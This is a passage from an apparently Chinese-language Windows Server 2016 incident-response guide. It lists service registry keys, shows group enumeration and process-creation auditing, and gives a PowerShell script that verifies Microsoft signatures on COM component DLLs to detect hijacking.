HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetBT
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Netlogon
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Netman
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\netprofm
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetSetupSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NetTcpPortSharing
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\netvsc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\netvscvfpp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NgcCtnrSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NgcSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NlaSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Npfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\npsvctrig
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nsi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nsiproxy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTFS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Null
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nvraid
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\nvstor
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\OneSyncSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\OneSyncSvc_448e2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Parallels Coherence Service
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Parallels Tools Service
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Parport
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\partmgr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PcaSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\pci
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\pciide
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\pcmcia
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\pcw
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\pdc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PEAUTH
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\percsas2i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\percsas3i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PerfDisk
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PerfHost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PerfNet
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PerfOS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PerfProc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PhoneSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PimIndexMaintenanceSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PimIndexMaintenanceSvc_448e2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\pla
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PlugPlay
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PolicyAgent
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PortProxy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Power
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PptpMiniport
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PrintNotify
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\PrlVssProvider
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\prl_boot
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\prl_dd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\prl_fs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\prl_memdev
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\prl_mouf
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\prl_strg
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\prl_tg
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Processor
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ProfSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Psched
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ql2300i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ql40xx2i
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\qlfcoei
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\QWAVE
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\QWAVEdrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RasAcd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RasAgileVpn
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RasAuto
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RasGre
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Rasl2tp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RasMan
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RasPppoe
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RasSstp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\rdbss
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RDMANDK
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\rdpbus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RDPDR
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RDPNP
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RDPUDD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RdpVideoMiniport
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ReFS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ReFSv1
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RegFilter
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RemoteAccess
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RemoteRegistry
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RmSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcEptMapper
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcLocator
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RpcSs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RSoPProv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\rspndr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\s3cap
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sacdrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sacsvr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SamSs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sbp2port
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SCardSvr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ScDeviceEnum
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\scfilter
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Schedule
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\scmbus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\scmdisk0101
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SCPolicySvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sdbus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sdstor
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\seclogon
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SENS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SensorDataService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SensorService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SensrSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SerCx
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SerCx2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Serenum
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Serial
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sermouse
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SessionEnv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sfloppy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ShellHWDetection
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SiSRaid2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SiSRaid4
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\smbdirect
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\smphost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SMSvcHost 4.0.0.0
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMPTRAP
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\spaceport
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SpbCx
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\spldr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Spooler
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\sppsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\srv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\srv2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\srvnet
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SSDPSRV
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SstpSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\StateRepository
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\stexstor
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\stisvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\storahci
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\storflt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\stornvme
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\storqosflt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\StorSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\storufs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\storvsc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\svsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\swenum
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\swprv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Synth3dVsc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SysMain
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SystemEventsBroker
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TabletInputService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TapiSrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip6
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TCPIP6TUNNEL
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\tcpipreg
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TCPIPTUNNEL
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\tdx
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\terminpt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TermService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Themes
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TieringEngineService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\tiledatamodelsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TimeBrokerSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TPM
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TrkWks
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TrustedInstaller
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TSDDD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TsUsbFlt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TsUsbGD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\tsusbhub
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\tunnel
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\tzautoupdate
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UALSVC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UASPStor
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UcmCx0101
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UcmTcpciCx0101
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UcmUcsi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Ucx01000
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UdeCx
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\udfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UEFI
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UevAgentDriver
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UevAgentService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Ufx01000
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UfxChipidea
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ufxsynopsys
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UGatherer
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UGTHRSVC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UI0Detect
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\umbus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UmPass
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UmRdpService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UnistoreSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UnistoreSvc_448e2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\upnphost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UrsChipidea
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UrsCx01000
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UrsSynopsys
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\usbccgp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\usbehci
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\usbhub
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBHUB3
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\usbohci
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\usbprint
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\usbser
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBSTOR
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\usbuhci
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\USBXHCI
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserDataSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserDataSvc_448e2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UserManager
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\UsoSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VaultSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vdrvroot
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vds
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VerifierExt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vhdmp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vhf
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmbus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VMBusHID
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmgid
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmicguestinterface
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmicheartbeat
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmickvpexchange
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmicrdv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmicshutdown
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmictimesync
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmicvmsession
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vmicvss
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\volmgr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\volmgrx
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\volsnap
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\volume
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vpci
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vsmraid
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VSS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\VSTXRAID
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\vwifibus
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WacomPen
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WalletService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wanarp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wanarpv6
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WbioSrvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wcifs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Wcmsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wcncsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wcnfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdBoot
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Wdf01000
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdFilter
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdiServiceHost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdiSystemHost
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisDrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WdNisSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Wecsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WEPHOSTSVC
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wercplsupport
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WerSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WFPLWFS
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WiaRpc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WIMMount
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinDefend
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Windows Workflow Foundation 4.0.0.0
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WindowsTrustedRT
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WindowsTrustedRTProxy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinHttpAutoProxySvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinMad
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Winmgmt
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinNat
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinRM
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Winsock
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WINUSB
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinVerbs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wisvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WlanSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wlidsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WmiAcpi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WmiApRpl
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wmiApSrv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Wof
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\workerdd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WPDBusEnum
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WpdUpFltr
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WpnService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WpnUserService
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WpnUserService_448e2
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\ws2ifsl
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WSearch
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WSearchIdxPi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wuauserv
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WudfPf
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WUDFRd
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\wudfsvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblAuthManager
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xboxgip
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xinputhid
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xmlprov

```
 以 `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave` 为例

 `reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\XblGameSave

```

### 2. 查看用户组

cmd中输入

 `net localgroup                  # 查看所有组
net localgroup Users        # 查看指定组

```
 此时，会显示出所有的用户组：

【 Windows Server 2016 】 默认情况

 `-------------------------------------------------------------------------------
*Access Control Assistance Operators
*Administrators
*Backup Operators
*Certificate Service DCOM Access
*Cryptographic Operators
*Distributed COM Users
*Event Log Readers
*Guests
*Hyper-V Administrators
*IIS_IUSRS
*Network Configuration Operators
*Performance Log Users
*Performance Monitor Users
*Power Users
*Print Operators
*RDS Endpoint Servers
*RDS Management Servers
*RDS Remote Access Servers
*Remote Desktop Users
*Remote Management Users
*Replicator
*Storage Replica Administrators
*System Managed Accounts Group
*Users
命令成功完成。

```

### 2. 组策略-审核进程创建

默认 `Windows Server 2016` 中没有开启审核进程创建的组策略，但是默认还是会记录部分进程创建，主要是系统上的默认程序

日志位置为 Windows 日志 -> 安全

进程事件ID : 4688

如果组策略开启后，会记录进程创建

`Windows + r` 输入 `gpedit.msc`

 `计算机配置 -> Windows设置 -> 安全设置 -> 高级审核策略配置 -> 详细跟踪 -> 审核进程创建

```

如果开启，则会记录命令行程序进程创建

### 2. 验证 COM 组件签名

如果攻击者比较变态，直接替换了文件或者向文件中注入了恶意代码，而不是劫持加载顺序，那么上面的排查就不会发现了，我们尝试将验证所有的 COM 组件的 DLL 签名

当然了，还是用  `Powershell` 来实现

 `$microsoftCNS = @('Microsoft Corporation', 'Microsoft Windows', 'Microsoft Windows Hardware Compatibility Publisher', 'Microsoft Update', 'Microsoft Windows Publisher')

# 定义函数来进行签名校验
function Verify-FileSignature {
    param (
        [Parameter(Mandatory=$true)]
        [ValidateScript({Test-Path $_ -PathType Leaf})]
        [string]$FilePath
    )

    if (Test-Path -Path $FilePath -PathType Leaf) {
        $signature = Get-AuthenticodeSignature -FilePath $FilePath

        if ($signature.Status -eq 'Valid') {
            $publisher = $signature.SignerCertificate.Subject

            # 解析发布者信息以提取 CN 字段的值
            $cnValues = @(($publisher -split ', ' | Where-Object { $_ -like 'CN=*' }).Substring(3))

            if ($cnValues.Count -eq 1) {
                $cnValue = $cnValues[0]
                # Write-Output "CN 字段的值: $cnValue"

                # 判断 CN 字段是否为微软官方
                if ($microsoftCNS -contains $cnValue) {
                    # Write-Output "CN 字段值为微软官方。"
                    return "Valid"
                }
            }
        }

        return "Invalid"

    }

    return "File Not Found"

}

# 定义函数来检查注册表地址
function Check-RegistryPaths {
    param (
        [Parameter(Mandatory=$true)]
        [string[]]$RegistryPaths
    )

    $invalidSignatures = @()

    foreach ($registryPath in $RegistryPaths) {
        if (Test-Path -Path $registryPath) {
            $subkeys = Get-ChildItem -Path $registryPath
            foreach ($subkey in $subkeys) {
                $inprocServer32Path = Join-Path -Path $subkey.PSPath -ChildPath "InprocServer32"
                if (Test-Path -Path $inprocServer32Path) {
                    $defaultPropertyValue = (Get-ItemProperty -Path $inprocServer32Path -Name "(default)" -ErrorAction SilentlyContinue)."(default)"
                    if ($defaultPropertyValue) {
                        # 此处加 Trim('"') 是为了防止类似于 Defender 这种“有个性”的软件胡乱设置注册表
                        $binaryFilePath = $defaultPropertyValue.Trim().Trim('"')
                        $binaryFilePath = [Environment]::ExpandEnvironmentVariables($binaryFilePath)
                        if (Test-Path $binaryFilePath) {
                            $result = Verify-FileSignature -FilePath $binaryFilePath
                            if ($result -eq "Invalid") {
                                $invalidSignatures += @{
                                    RegistryPath = $subkey
                                    BinaryFilePath = $binaryFilePath
                                }
                                Write-Host "Signature is invalid for file: $binaryFilePath" -ForegroundColor Red
                            } elseif ($result -eq "Valid") {
                                Write-Host "Signature is valid for file: $binaryFilePath " -ForegroundColor Green
                            }
                        } else {
                            $dllFileName = Split-Path -Leaf $binaryFilePath
                            $found = $false
                            $searchPaths = @(
                                (Join-Path -Path $env:SystemRoot -ChildPath $dllFileName),
